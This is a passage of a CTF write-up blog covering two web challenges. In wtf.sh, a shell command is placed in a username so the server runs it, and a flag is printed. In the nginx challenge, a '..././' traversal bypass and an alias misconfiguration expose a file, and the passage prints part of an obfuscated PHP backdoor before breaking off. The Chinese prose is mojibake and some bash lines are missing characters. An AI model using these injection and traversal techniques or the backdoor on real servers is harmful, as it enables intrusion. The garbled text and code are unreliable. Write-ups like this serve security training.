</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">max_page_include_depth=64
</span></span><span class="line"><span class="cl">page_include_depth=0
</span></span><span class="line"><span class="cl">function include_page {
</span></span><span class="line"><span class="cl">    # include_page pathname
</span></span><span class="line"><span class="cl">    local pathname=$1
</span></span><span class="line"><span class="cl">    local cmd=
</span></span><span class="line"><span class="cl">    [[ ${pathname(-4)} = &#39;.wtf&#39; ]];
</span></span><span class="line"><span class="cl">    local can_execute=$;
</span></span><span class="line"><span class="cl">    page_include_depth=$(($page_include_depth+1))
</span></span><span class="line"><span class="cl">    if [[ $page_include_depth -lt $max_page_include_depth ]]
</span></span><span class="line"><span class="cl">    then
</span></span><span class="line"><span class="cl">        local line;
</span></span><span class="line"><span class="cl">        while read -r line; do
</span></span><span class="line"><span class="cl">            # check if we&#39;re in a script line or not ($ at the beginning implies script line)
</span></span><span class="line"><span class="cl">            # also, our extension needs to be .wtf
</span></span><span class="line"><span class="cl">            [[ $ = ${line01} &amp;&amp; ${can_execute} = 0 ]];
</span></span><span class="line"><span class="cl">            is_script=$;
</span></span><span class="line"><span class="cl">            # execute the line.
</span></span><span class="line"><span class="cl">            if [[ $is_script = 0 ]]
</span></span><span class="line"><span class="cl">            then
</span></span><span class="line"><span class="cl">                cmd+=$&#39;n&#39;${line#$};
</span></span><span class="line"><span class="cl">            else
</span></span><span class="line"><span class="cl">                if [[ -n $cmd ]]
</span></span><span class="line"><span class="cl">                then
</span></span><span class="line"><span class="cl">                    eval $cmd  log Error during execution of ${cmd};
</span></span><span class="line"><span class="cl">                    cmd=
</span></span><span class="line"><span class="cl">                fi
</span></span><span class="line"><span class="cl">                echo $line
</span></span><span class="line"><span class="cl">            fi
</span></span><span class="line"><span class="cl">        done  ${pathname}
</span></span><span class="line"><span class="cl">    else
</span></span><span class="line"><span class="cl">        echo pMax include depth exceeded!p
</span></span><span class="line"><span class="cl">    fi
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåË¶ÅÊ±ÇË∑ØÂæÑÂêçÁöÑÂêéÁºÄÂøÖÈ°ªÊòØ.wtf</p>
<p>ÁÑ∂ÂêéÂèàÊâæÂà∞‰∏Ä‰∏™replyÂäüËÉΩÁöÑÂáΩÊï∞</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">function reply {
</span></span><span class="line"><span class="cl">    local post_id=$1;
</span></span><span class="line"><span class="cl">    local username=$2;
</span></span><span class="line"><span class="cl">    local text=$3;
</span></span><span class="line"><span class="cl">    local hashed=$(hash_username &#34;${username}&#34;);
</span></span><span class="line"><span class="cl">    curr_id=$(for d in posts/${post_id}/*; do basename $d; done | sort -n | tail -n 1);
</span></span><span class="line"><span class="cl">    next_reply_id=$(awk &#39;{print $1+1}&#39; &lt;&lt;&lt; &#34;${curr_id}&#34;);
</span></span><span class="line"><span class="cl">    next_file=(posts/${post_id}/${next_reply_id});
</span></span><span class="line"><span class="cl">    echo &#34;${username}&#34; &gt; &#34;${next_file}&#34;;
</span></span><span class="line"><span class="cl">    echo &#34;RE: $(nth_line 2 &lt; &#34;posts/${post_id}/1&#34;)&#34; &gt;&gt; &#34;${next_file}&#34;;
</span></span><span class="line"><span class="cl">    echo &#34;${text}&#34; &gt;&gt; &#34;${next_file}&#34;;
</span></span><span class="line"><span class="cl">    # add post this is in reply to to posts cache
</span></span><span class="line"><span class="cl">    echo &#34;${post_id}/${next_reply_id}&#34; &gt;&gt; &#34;users_lookup/${hashed}/posts&#34;;
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂäüËÉΩÊòØÊääÁî®Êà∑ÂêçÂÜôËøõÊñá‰ª∂‰∏≠</p>
<p>Â¶ÇÊûúÁî®Êà∑ÂêçÊòØ‰∏ÄÊÆµÂèØÊâßË°å‰ª£Á†ÅÔºåËÄå‰∏îÂÜôÂÖ•ÁöÑÊñá‰ª∂ÊòØ wtf Ê†ºÂºèÁöÑÔºåÈÇ£‰πàËøô‰∏™Êñá‰ª∂Â∞±ËÉΩÂ§üÊâßË°åÊàë‰ª¨ÊÉ≥Ë¶ÅÁöÑ‰ª£Á†Å„ÄÇ ÔºàËÄå‰∏îwtf.shÂè™ËøêË°åÊñá‰ª∂Êâ©Â±ïÂêç‰∏∫.wtfÁöÑËÑöÊú¨ÂíåÂâçÁºÄ‰∏∫‚Äô$&lsquo;ÁöÑË°åÔºâ</p>
<p>ÂâçÈù¢ÈÇ£‰∏™ÊòØget_flag1Ôºå‰∏çÈöæÊÉ≥Âà∞Âêé‰∏Ä‰∏™ÊòØget_flag2</p>
<p>Êàë‰ª¨Áî®${find,/,-iname,get_flag2}‰Ωú‰∏∫Áî®Êà∑ÂêçÊù•Áî®replyÂäüËÉΩ</p>
<p>‰∏ä‰º†ÁöÑwtfÊñá‰ª∂Âêç‰ªªÊÑèÔºå‰ΩÜÊòØË¶ÅÊãºÊé•Ê∞¥Âπ≥Âà∂Ë°®Á¨¶%09Ôºå‰∏çÁÑ∂ÂêéÂè∞‰ºöÊääÊàë‰ª¨ÁöÑÂêéÈó®ÂΩìÂÅöÁõÆÂΩïÂéªËß£Êûê</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201215606000.png"
	width="1865"
	height="659"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201215606000_hu16873573283146899598.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201215606000_hu3537655306649278996.png 1024w"
	loading="lazy"
	
		alt="image-20250201215606000"
	
	
		class="gallery-image" 
		data-flex-grow="283"
		data-flex-basis="679px"
	
></p>
<p>‰∏ä‰º†1.wtf</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201215850106.png"
	width="1345"
	height="826"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201215850106_hu6541983734369377198.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201215850106_hu11023255895723475776.png 1024w"
	loading="lazy"
	
		alt="image-20250201215850106"
	
	
		class="gallery-image" 
		data-flex-grow="162"
		data-flex-basis="390px"
	
></p>
<p>ÊãøÂà∞ÁõÆÂΩï</p>
<p>Êé•‰∏ãÊù•ÂÜçÊ≥®ÂÜå‰∏Ä‰∏™Ë¥¶Êà∑$/usr/bin/get_flag2</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201220107605.png"
	width="1885"
	height="727"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201220107605_hu4462495600524690112.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201220107605_hu2702483922739394632.png 1024w"
	loading="lazy"
	
		alt="image-20250201220107605"
	
	
		class="gallery-image" 
		data-flex-grow="259"
		data-flex-basis="622px"
	
></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201220132626.png"
	width="1420"
	height="809"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201220132626_hu8321377471205591067.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201220132626_hu17806901830766899800.png 1024w"
	loading="lazy"
	
		alt="image-20250201220132626"
	
	
		class="gallery-image" 
		data-flex-grow="175"
		data-flex-basis="421px"
	
></p>
<p>ÊãøÂà∞ÂêéÊÆµflagÔºåÊãºÊé•Âç≥ÂèØ</p>
<p>xctf{cb49256d1ab48803149e5ec49d3c29ca}</p>
<h2 id="web_php_wrong_nginx_config">Web_php_wrong_nginx_config
</h2><p>ÁõÆÂΩïÊâ´Êèè</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250202110157405.png"
	width="1483"
	height="762"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250202110157405_hu3534152769462350601.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250202110157405_hu15712830981790242710.png 1024w"
	loading="lazy"
	
		alt="image-20250202110157405"
	
	
		class="gallery-image" 
		data-flex-grow="194"
		data-flex-basis="467px"
	
></p>
<p>Êúârobots.txt</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250202110225848.png"
	width="241"
	height="76"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250202110225848_hu2157805303569022078.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250202110225848_hu16472365015846686042.png 1024w"
	loading="lazy"
	
		alt="image-20250202110225848"
	
	
		class="gallery-image" 
		data-flex-grow="317"
		data-flex-basis="761px"
	
></p>
<p>ÊâìÂºÄhint.phpÊèêÁ§∫Êàë‰ª¨ÈÖçÁΩÆÊñá‰ª∂‰πüËÆ∏ÊúâÈóÆÈ¢òÂëÄÔºö/etc/nginx/sites-enabled/site.conf</p>
<p>ÁÑ∂Âêéhack.phpÊèêÁ§∫Êàë‰ª¨ÁôªÂÖ•ÔºåÊàë‰ª¨ÊäìÂåÖÁúã‰ø°ÊÅØ</p>
<p>ÊääisLoginÊîπ‰∏∫1</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250202110844545.png"
	width="1310"
	height="851"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250202110844545_hu4830433876523042565.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250202110844545_hu7775750806417071714.png 1024w"
	loading="lazy"
	
		alt="image-20250202110844545"
	
	
		class="gallery-image" 
		data-flex-grow="153"
		data-flex-basis="369px"
	
></p>
<p>Âè™ÊúâÁÆ°ÁêÜ‰∏≠ÂøÉËÉΩÁÇπ</p>
<p>ÊäìÂåÖÁªßÁª≠Êîπ‰∏∫1</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250202111027338.png"
	width="1430"
	height="570"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250202111027338_hu15478827690306145758.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250202111027338_hu5950639644278379944.png 1024w"
	loading="lazy"
	
		alt="image-20250202111027338"
	
	
		class="gallery-image" 
		data-flex-grow="250"
		data-flex-basis="602px"
	
></p>
<p>Âá∫Áé∞fileÂèÇÊï∞ÊÉ≥Âà∞Êñá‰ª∂ÂåÖÂê´ÔºåË¶ÅÂåÖÂê´‰πãÂâçÁöÑnginxÊ∫êÁ†Å</p>
<p>ÊµãËØïÂá†Ê¨°ÊÄÄÁñë../Ë¢´ËøáÊª§Ôºå</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250202111159482.png"
	width="1709"
	height="686"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250202111159482_hu380629539779224642.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250202111159482_hu7755831932044061568.png 1024w"
	loading="lazy"
	
		alt="image-20250202111159482"
	
	
		class="gallery-image" 
		data-flex-grow="249"
		data-flex-basis="597px"
	
></p>
<p>ÊèêÁ§∫continue</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250202111227804.png"
	width="1570"
	height="505"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250202111227804_hu11528427845614717424.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250202111227804_hu4058713864964259086.png 1024w"
	loading="lazy"
	
		alt="image-20250202111227804"
	
	
		class="gallery-image" 
		data-flex-grow="310"
		data-flex-basis="746px"
	
></p>
<p>ËÄå./Ê≤°ÊúâË¢´ËøáÊª§</p>
<p>ÊâÄ‰ª•Êàë‰ª¨Áî®&hellip;/./ÂèåÂÜôÊõøÊç¢../ÁªïËøá</p>
<p>Âπ∂ÊãºÊé•Ââç‰∏ãÁöÑÁõÆÂΩï<code>..././..././..././..././/etc/nginx/sites-enabled/site.conf&amp;ext= </code></p>
<p>Âá∫Áé∞ÈÖçÁΩÆÊñá‰ª∂</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">server</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">listen</span> <span class="mi">8080</span><span class="p">;</span> <span class="c1">## listen for ipv4; this line is default and implied</span>
</span></span><span class="line"><span class="cl">    <span class="n">listen</span> <span class="p">[::]:</span><span class="mi">8080</span><span class="p">;</span> <span class="c1">## listen for ipv6</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">root</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">index</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span> <span class="n">index</span><span class="o">.</span><span class="n">html</span> <span class="n">index</span><span class="o">.</span><span class="n">htm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">port_in_redirect</span> <span class="n">off</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">server_name</span> <span class="n">_</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Make site accessible from http://localhost/</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#server_name localhost;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># If block for setting the time for the logfile</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">$</span><span class="n">time_iso8601</span> <span class="o">~</span> <span class="s2">&#34;^(\d{4})-(\d{2})-(\d{2})&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">       <span class="n">set</span> <span class="o">$</span><span class="n">year</span> <span class="o">$</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">       <span class="n">set</span> <span class="o">$</span><span class="n">month</span> <span class="o">$</span><span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">       <span class="n">set</span> <span class="o">$</span><span class="n">day</span> <span class="o">$</span><span class="mi">3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Disable sendfile as per https://docs.vagrantup.com/v2/synced-folders/virtualbox.html</span>
</span></span><span class="line"><span class="cl">    <span class="n">sendfile</span> <span class="n">off</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">set</span> <span class="o">$</span><span class="n">http_x_forwarded_for_filt</span> <span class="o">$</span><span class="n">http_x_forwarded_for</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">$</span><span class="n">http_x_forwarded_for_filt</span> <span class="o">~</span> <span class="p">([</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="p">]</span><span class="o">+</span>\<span class="o">.</span><span class="p">[</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="p">]</span><span class="o">+</span>\<span class="o">.</span><span class="p">[</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="p">]</span><span class="o">+</span>\<span class="o">.</span><span class="p">)[</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="p">]</span><span class="o">+</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">set</span> <span class="o">$</span><span class="n">http_x_forwarded_for_filt</span> <span class="o">$</span><span class="mi">1</span><span class="err">???</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Add stdout logging</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">access_log</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">nginx</span><span class="o">/$</span><span class="n">hostname</span><span class="o">-</span><span class="n">access</span><span class="o">-$</span><span class="n">year</span><span class="o">-$</span><span class="n">month</span><span class="o">-$</span><span class="n">day</span><span class="o">.</span><span class="n">log</span> <span class="n">openshift_log</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">error_log</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">error</span><span class="o">.</span><span class="n">log</span> <span class="n">info</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">location</span> <span class="o">/</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># First attempt to serve request as file, then</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># as directory, then fall back to index.html</span>
</span></span><span class="line"><span class="cl">        <span class="n">try_files</span> <span class="o">$</span><span class="n">uri</span> <span class="o">$</span><span class="n">uri</span><span class="o">/</span> <span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">q</span><span class="o">=$</span><span class="n">uri</span><span class="o">&amp;$</span><span class="n">args</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">server_tokens</span> <span class="n">off</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">#error_page 404 /404.html;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># redirect server error pages to the static page /50x.html</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#</span>
</span></span><span class="line"><span class="cl">    <span class="n">error_page</span> <span class="mi">500</span> <span class="mi">502</span> <span class="mi">503</span> <span class="mi">504</span> <span class="o">/</span><span class="mi">50</span><span class="n">x</span><span class="o">.</span><span class="n">html</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">location</span> <span class="o">=</span> <span class="o">/</span><span class="mi">50</span><span class="n">x</span><span class="o">.</span><span class="n">html</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">root</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">html</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">location</span> <span class="o">~</span> \<span class="o">.</span><span class="n">php</span><span class="o">$</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">try_files</span> <span class="o">$</span><span class="n">uri</span> <span class="o">$</span><span class="n">uri</span><span class="o">/</span> <span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">q</span><span class="o">=$</span><span class="n">uri</span><span class="o">&amp;$</span><span class="n">args</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">fastcgi_split_path_info</span> <span class="o">^</span><span class="p">(</span><span class="o">.+</span>\<span class="o">.</span><span class="n">php</span><span class="p">)(</span><span class="o">/.+</span><span class="p">)</span><span class="o">$</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">fastcgi_pass</span> <span class="n">unix</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">php</span><span class="o">/</span><span class="n">php5</span><span class="o">.</span><span class="mi">6</span><span class="o">-</span><span class="n">fpm</span><span class="o">.</span><span class="n">sock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">fastcgi_param</span> <span class="n">SCRIPT_FILENAME</span> <span class="o">$</span><span class="n">document_root</span><span class="o">$</span><span class="n">fastcgi_script_name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">fastcgi_param</span> <span class="n">SCRIPT_NAME</span> <span class="o">$</span><span class="n">fastcgi_script_name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">fastcgi_index</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">include</span> <span class="n">fastcgi_params</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">fastcgi_param</span> <span class="n">REMOTE_ADDR</span> <span class="o">$</span><span class="n">http_x_forwarded_for</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">location</span> <span class="o">~</span> <span class="o">/</span>\<span class="o">.</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">log_not_found</span> <span class="n">off</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">deny</span> <span class="n">all</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">location</span> <span class="o">/</span><span class="n">web</span><span class="o">-</span><span class="n">img</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">alias</span> <span class="o">/</span><span class="n">images</span><span class="o">/</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">autoindex</span> <span class="n">on</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">location</span> <span class="o">~*</span> \<span class="o">.</span><span class="p">(</span><span class="n">ini</span><span class="o">|</span><span class="n">docx</span><span class="o">|</span><span class="n">pcapng</span><span class="o">|</span><span class="n">doc</span><span class="p">)</span><span class="o">$</span> <span class="p">{</span>  
</span></span><span class="line"><span class="cl">         <span class="n">deny</span> <span class="n">all</span><span class="p">;</span>  
</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">include</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">nginx</span><span class="p">[</span><span class="o">.</span><span class="p">]</span><span class="n">conf</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">location /web-img {
</span></span><span class="line"><span class="cl">        alias /images/;
</span></span><span class="line"><span class="cl">        autoindex on;
</span></span><span class="line"><span class="cl">    }
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÊèêÁ§∫ÁõÆÂΩï/web-imgÂèØ‰ª•Êñá‰ª∂ÈÅçÂéÜ„ÄÅ</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250202111845610.png"
	width="1320"
	height="807"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250202111845610_hu17330926124385727111.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250202111845610_hu10405021244720812069.png 1024w"
	loading="lazy"
	
		alt="image-20250202111845610"
	
	
		class="gallery-image" 
		data-flex-grow="163"
		data-flex-basis="392px"
	
></p>
<p>ÊÉ≥Âà∞nginxÁöÑÊ∫êÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û</p>
<p>Áî®web-img../</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250202111941013.png"
	width="1144"
	height="554"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250202111941013_hu13980549875263700958.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250202111941013_hu4816632197237913222.png 1024w"
	loading="lazy"
	
		alt="image-20250202111941013"
	
	
		class="gallery-image" 
		data-flex-grow="206"
		data-flex-basis="495px"
	
></p>
<p>Êü•ÊâæÊúâÁî®‰ø°ÊÅØ</p>
<p>Ëøõvar/www/ÂèëÁé∞hack.phpÁöÑÂ§á‰ªΩ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$U</span><span class="o">=</span><span class="s1">&#39;_/|U&#34;,&#34;/-/|U&#34;),ar|Uray|U(&#34;/|U&#34;,&#34;+&#34;),$ss(|U$s[$i]|U,0,$e)|U)),$k))|U|U);$o|U|U=o|Ub_get_|Ucontents(|U);|Uob_end_cle&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$q</span><span class="o">=</span><span class="s1">&#39;s[|U$i]=&#34;&#34;;$p=|U$ss($p,3);}|U|Uif(array_k|Uey_|Uexis|Uts($|Ui,$s)){$s[$i].=|U$p|U;|U$e=|Ustrpos($s[$i],$f);|Ui&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$M</span><span class="o">=</span><span class="s1">&#39;l=&#34;strtolower|U&#34;;$i=$m|U[1|U][0].$m[1]|U[1];$|U|Uh=$sl($ss(|Umd5($i|U.$kh),|U0,3|U));$f=$s|Ul($ss(|Umd5($i.$&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$z</span><span class="o">=</span><span class="s1">&#39;r=@$r[|U&#34;HTTP_R|UEFERER|U&#34;];$r|U|Ua=@$r[&#34;HTTP_A|U|UCCEPT_LAN|UGUAGE|U&#34;];if|U($r|Ur&amp;|U&amp;$ra){$u=parse_|Uurl($r&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$k</span><span class="o">=</span><span class="s1">&#39;?:;q=0.([\\|Ud]))?,|U?/&#34;,$ra,$m)|U;if($|Uq&amp;&amp;$m){|U|U|U@session_start()|U|U;$s=&amp;$_SESSIO|UN;$ss=&#34;|Usubst|Ur&#34;;|U|U$s&#39;</span><span class="p">;</span>
